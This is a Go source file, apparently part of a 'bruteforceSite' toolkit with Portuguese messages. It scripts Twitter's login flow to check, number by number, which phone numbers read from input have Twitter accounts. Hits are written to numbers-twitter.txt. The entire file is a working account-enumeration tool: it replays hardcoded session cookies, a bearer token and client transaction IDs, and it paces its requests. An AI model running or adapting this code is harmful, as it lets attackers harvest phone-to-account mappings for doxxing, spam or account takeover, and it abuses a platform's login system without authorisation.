package bruteforceSite

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

type Error struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

type ResponseFlow struct {
	FlowToken string  `json:"flow_token"`
	Status    string  `json:"status"`
	Errors    []Error `json:"errors"`
}

func BruteTwitter() {
	var XGuestToken string
	Cookie := "guest_id_marketing=v1%3A170279361290794611; guest_id_ads=v1%3A170279361290794611; personalization_id=v1_p+Jp/QF53mCOl9XM7Y8i1A==; guest_id=v1%3A170279361290794611; gt=1736268372474462334; att=1-dtstkAesfxyFE0MY9dn2YonBDs73wy5ky3sveArn; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCG2%252BaHaMAToMY3NyZl9p%250AZCIlZmUxNjg1ZDIwM2MxNjYwZTRjNDk5ODhjNWM4YzQzMGM6B2lkIiViYWNl%250ANjQ1ZDE0NjE5MTA0OTBlZjZiMGQ5ZjM0NTUzNw%253D%253D--9d8d698f4781b92f1e4fd1e01b6f5ebe5293fbf0"

	numberphones := []string{}
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		numberphones = append(numberphones, strings.Replace(scanner.Text(), "+", "", -1))
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "Erro de leitura:", err)
	}
	data := []byte(`{"input_flow_data":{"flow_context":{"debug_overrides":{},"start_location":{"location":"splash_screen"}}},"subtask_versions":{"action_list":2,"alert_dialog":1,"app_download_cta":1,"check_logged_in_account":1,"choice_selection":3,"contacts_live_sync_permission_prompt":0,"cta":7,"email_verification":2,"end_flow":1,"enter_date":1,"enter_email":2,"enter_password":5,"enter_phone":2,"enter_recaptcha":1,"enter_text":5,"enter_username":2,"generic_urt":3,"in_app_notification":1,"interest_picker":3,"js_instrumentation":1,"menu_dialog":1,"notifications_permission_prompt":2,"open_account":2,"open_home_timeline":1,"open_link":1,"phone_verification":4,"privacy_options":1,"security_key":3,"select_avatar":4,"select_banner":2,"settings_list":7,"show_code":1,"sign_up":2,"sign_up_review":4,"tweet_selection_urt":1,"update_users":1,"upload_media":1,"user_recommendations_list":4,"user_recommendations_urt":1,"wait_spinner":3,"web_modal":1}}`)
	req, err := http.NewRequest("GET", "https://twitter.com/", bytes.NewBuffer(data))
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Dnt", "1")
	req.Header.Set("Sec-Gpc", "1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Te", "trailers")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	gz, err := gzip.NewReader(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	defer gz.Close()

	body, err := ioutil.ReadAll(gz)
	if err != nil {
		log.Fatal(err)
	}
	re := regexp.MustCompile(`gt=(\d+);`)
	match := re.FindStringSubmatch(string(body))

	if len(match) > 0 {
		XGuestToken = match[1]
	} else {
		log.Fatalln("Nenhum valor de cookie 'guest_token' encontrado")
	}

	url := "https://api.twitter.com/1.1/onboarding/task.json"
	for _, numberphone := range numberphones {
		data := []byte(`{"input_flow_data":{"flow_context":{"debug_overrides":{},"start_location":{"location":"splash_screen"}}},"subtask_versions":{"action_list":2,"alert_dialog":1,"app_download_cta":1,"check_logged_in_account":1,"choice_selection":3,"contacts_live_sync_permission_prompt":0,"cta":7,"email_verification":2,"end_flow":1,"enter_date":1,"enter_email":2,"enter_password":5,"enter_phone":2,"enter_recaptcha":1,"enter_text":5,"enter_username":2,"generic_urt":3,"in_app_notification":1,"interest_picker":3,"js_instrumentation":1,"menu_dialog":1,"notifications_permission_prompt":2,"open_account":2,"open_home_timeline":1,"open_link":1,"phone_verification":4,"privacy_options":1,"security_key":3,"select_avatar":4,"select_banner":2,"settings_list":7,"show_code":1,"sign_up":2,"sign_up_review":4,"tweet_selection_urt":1,"update_users":1,"upload_media":1,"user_recommendations_list":4,"user_recommendations_urt":1,"wait_spinner":3,"web_modal":1}}`)
		req, err := http.NewRequest("POST", url+"?flow_name=login", bytes.NewBuffer(data))
		if err != nil {
			log.Fatal(err)
		}
		req.Header.Set("Cookie", Cookie)
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0")
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
		req.Header.Set("X-Guest-Token", XGuestToken)
		req.Header.Set("X-Twitter-Client-Language", `pt`)
		req.Header.Set("X-Twitter-Active-User", `yes`)
		req.Header.Set("X-Client-Transaction-Id", `294fo+cezBabi/53lRT2muUvxSLZMMafzNTejiHNsF3AXv40B67YY9DARXIzHwJcQV/r9NqBNZyePRBCr7lIBq9p3un02g`)
		req.Header.Set("Origin", "https://twitter.com")
		req.Header.Set("Dnt", "1")
		req.Header.Set("Sec-Gpc", "1")
		req.Header.Set("Referer", "https://twitter.com/")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-site")
		req.Header.Set("Te", "trailers")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()

		gz, err := gzip.NewReader(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		defer gz.Close()

		body, err := ioutil.ReadAll(gz)
		if err != nil {
			log.Fatal(err)
		}
		var flowFirst ResponseFlow
		err = json.Unmarshal(body, &flowFirst)
		if err != nil {
			fmt.Printf("Erro ao desempacotar o JSON: %v\n", err)
			return
		}
		//fmt.Println("flowFirst:", flowFirst.FlowToken)
		//------------------------ Second Flow ----------------------------//
		data = []byte(`{"flow_token":"` + flowFirst.FlowToken + `","subtask_inputs":[{"subtask_id":"LoginJsInstrumentationSubtask","js_instrumentation":{"response":"{\"rf\":{\"cbc755372c4bef195a400c73992bde343b7e9e218a7997638862c7fb2f6b377a\":-2,\"a945ae8ccc216f9f57672af0ba6c9d28116df2406c0941793fdfd96cdfae32f4\":-30,\"a38c8043308b270d0e4a3cdf9bd6c09e58ba72b9d60e232f654b6f238c802141\":13,\"a87032323aeb6690a52b09c8056ec406135b12cb9a47b01fac68b0cca9eac5ef\":-2},\"s\":\"Zve1iVVxEylGmG3kWNra8B_x0ZWE3tRwk-2Hd6YmV7dqPQUxI1pWu4hwgHGIyTO0vwIf3hYGfR-rsX2v-3ahq0dZ-QhWPyC2sX_hPyPbco9yTJWF9ZATu-F3mufI3o6wnIgdzkN3IK7WVDfxss3UPO0zH8jW9ildcHwJxJDoMxn3PHIdukv-bQm1hLsSRpBw1BImU3jE-oxxp3aGYWHfRzSQ5sz3E9TLod2d07WcF3rZRXayXgB-w1Q8Ry6Qvd6Km_lG5Fgfohykj15VT99eOyFQRO8S2CZq-njw3qAJ46Tnn64Rp6aFdzx4O7EkQdnk4A5j-cPHKFDklqvdbw2-ZwAAAYx2cfnl\"}","link":"next_link"}}]}`)
		req, err = http.NewRequest("POST", url, bytes.NewBuffer(data))
		if err != nil {
			log.Fatal(err)
		}
		req.Header.Set("Cookie", Cookie)
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0")
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
		req.Header.Set("X-Guest-Token", XGuestToken)
		req.Header.Set("X-Twitter-Client-Language", `pt`)
		req.Header.Set("X-Twitter-Active-User", `yes`)
		req.Header.Set("X-Client-Transaction-Id", `DwrLdzPKGMJPXyqjQcAiTjH7EfYN5BJLGAAKWvUZZIkUiirg03oMtwQUkabny9aIlYk/IA5j811T8iI744yBz8BRj0vSDg`)
		req.Header.Set("Origin", "https://twitter.com")
		req.Header.Set("Dnt", "1")
		req.Header.Set("Sec-Gpc", "1")
		req.Header.Set("Referer", "https://twitter.com/")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-site")
		req.Header.Set("Te", "trailers")

		client = &http.Client{}
		resp, err = client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()

		gz, err = gzip.NewReader(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		defer gz.Close()

		body, err = ioutil.ReadAll(gz)
		if err != nil {
			log.Fatal(err)
		}
		var flowSecond ResponseFlow
		err = json.Unmarshal(body, &flowSecond)
		if err != nil {
			fmt.Printf("Erro ao desempacotar o JSON: %v\n", err)
			return
		}
		//fmt.Println("flowSecond:", flowSecond.FlowToken)

		//-------------------------- Third Flow -----------------------------//
		data = []byte(`{"flow_token":"` + flowSecond.FlowToken + `","subtask_inputs":[{"subtask_id":"LoginEnterUserIdentifierSSO","settings_list":{"setting_responses":[{"key":"user_identifier","response_data":{"text_data":{"result":"` + numberphone + `"}}}],"link":"next_link"}}]}`)
		req, err = http.NewRequest("POST", url, bytes.NewBuffer(data))
		if err != nil {
			log.Fatal(err)
		}
		req.Header.Set("Cookie", Cookie)
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0")
		req.Header.Set("Accept", "*/*")
		req.Header.Set("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Authorization", "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
		req.Header.Set("X-Guest-Token", XGuestToken)
		req.Header.Set("X-Twitter-Client-Language", `pt`)
		req.Header.Set("X-Twitter-Active-User", `yes`)
		req.Header.Set("X-Client-Transaction-Id", `LyrrVxPqOOJvfwqDYeACbhHbMdYtxDJrOCAqetU5RKk0qgrA81oslyQ0sYbH6/aotbIfAC4zlywnYmb74HpObcQLIQ+FLg`)
		req.Header.Set("Origin", "https://twitter.com")
		req.Header.Set("Dnt", "1")
		req.Header.Set("Sec-Gpc", "1")
		req.Header.Set("Referer", "https://twitter.com/")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-site")
		req.Header.Set("Te", "trailers")

		client = &http.Client{}
		resp, err = client.Do(req)
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()

		gz, err = gzip.NewReader(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		defer gz.Close()

		body, err = ioutil.ReadAll(gz)
		if err != nil {
			log.Fatal(err)
		}
		var flowThird ResponseFlow
		err = json.Unmarshal(body, &flowThird)
		if err != nil {
			fmt.Printf("Erro ao desempacotar o JSON: %v\n", err)
			return
		}
		if flowThird.Status == "success" {
			fmt.Println("[+] User Exist:", numberphone)
			WriteToFile("numbers-twitter.txt", numberphone+"\n", "./numberphone/")
		} else {
			if len(flowThird.Errors) > 0 {
				if flowThird.Errors[0].Code == 399 {
					fmt.Println("[-] User Not Exist:", numberphone)
				} else if flowThird.Errors[0].Code == 239 {
					log.Fatalln("[-] BAD Guest Token, update XGuestToken.")
				} else {
					fmt.Println("[-] Response status error:", flowThird.Errors[0].Code)
					fmt.Println("[-] Response status error:", string(body))
				}
			} else {
				fmt.Println("ERROR::", string(body))
			}
		}
		time.Sleep(500 * time.Millisecond)
	}
}
